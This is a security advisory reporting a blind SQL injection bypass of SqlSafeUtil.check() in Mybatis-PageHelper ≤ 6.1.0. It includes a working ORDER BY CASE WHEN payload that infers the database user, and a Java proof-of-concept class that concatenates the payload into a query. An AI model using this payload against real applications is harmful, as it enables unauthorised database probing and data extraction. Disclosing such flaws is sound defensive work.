Title: SQL Injection Vulnerability in Mybatis-PageHelper ≤ 6.1.0
BUG_Author: Svanur
Affected Version: Mybatis-PageHelper ≤ 6.1.0
Vendor: Mybatis-PageHelper GitHub Repository
Software: Mybatis-PageHelper
Vulnerability Files:
● src/main/java/com/github/pagehelper/util/SqlSafeUtil.java
Description:
1. Blind SQL Injection via ORDER BY clause:
  ○ In the SqlSafeUtil.check() method, the supplied ORDER BY parameter is not strictly validated.
  ○ Payloads such as case when current_user regexp 0x726f6f74 then 1 else 2 end bypass the check, enabling boolean-based SQL injection through sorting logic.
2. Exploiting the Injection:
  ○ By injecting a crafted CASE WHEN expression into the ORDER BY clause, an attacker can infer database state (e.g., current user) based on result ordering.
3. Example Injection Payload:
ORDER BY case when current_user regexp 0x726f6f74 then uuid else id end ASC
4. Constructing the Vulnerable Query:
  ○ Example query executed without Page.setUnsafeOrderBy:
SELECT * FROM users ORDER BY case when current_user regexp 0x726f6f74 then uuid else id end ASC;
5. Verifying the Exploit:
  ○ When the current user is root (hex 0x726f6f74), results sort by uuid; otherwise they sort by id.
Proof of Concept:
1. Create and run the following Java test class:
import com.github.pagehelper.PageException;
import com.github.pagehelper.util.SqlSafeUtil;
import java.sql.*;

public class Test {
    public static Boolean setOrderBy(String orderBy) {
        if (SqlSafeUtil.check(orderBy)) {
            throw new PageException("order by [" + orderBy + "] has a risk of SQL injection, " +
                    "if you want to avoid SQL injection verification, you can call Page.setUnsafeOrderBy");
        }
        return true;
    }

    public static void main(String[] args) {
        String url = "jdbc:mysql://localhost:3306/test?useUnicode=true&characterEncoding=utf8&useSSL=true";
        String username = "root";
        String password = "123456";

        String payload = "case when current_user regexp 0x726f6f74 then uuid else id end ASC";
        String sql = "SELECT * FROM users ORDER BY " + payload;

        if (setOrderBy(payload) && setOrderBy(payload)) {
            // proceed to execute
        }

        try (Connection conn = DriverManager.getConnection(url, username, password);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(sql)) {
            while (rs.next()) {
                System.out.println("id:" + rs.getString(1) + "---uuid:" + rs.getString(2) + "---user:" + rs.getString(3));
            }
        } catch (SQLException ex) {
            ex.printStackTrace();
        }
    }
}
2. Execute with payload. Observe that when current_user matches root, results are ordered by uuid; otherwise by id, confirming the blind SQL injection vulnerability.
